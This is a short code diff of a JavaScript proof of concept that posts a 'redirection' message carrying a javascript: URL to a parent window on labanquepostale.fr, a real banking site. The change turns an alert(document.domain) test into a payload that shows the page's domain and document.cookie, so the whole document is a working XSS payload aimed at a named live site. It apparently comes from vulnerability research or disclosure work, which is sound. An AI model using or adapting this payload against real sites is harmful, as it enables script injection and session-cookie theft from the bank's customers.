@@ -3,7 +3,7 @@ window.parent.postMessage(
     JSON.stringify({
         "type": "redirection",
         "message": {
-            "url": "javascript:alert(document.domain)"
+            "url": "javascript:if (confirm('Cible : ' + document.domain + '\n\n' + 'Cookie : ' + document.cookie) === true) {window.close()};"
         }
     }),
     "https://www.labanquepostale.fr"  // targetOrigin
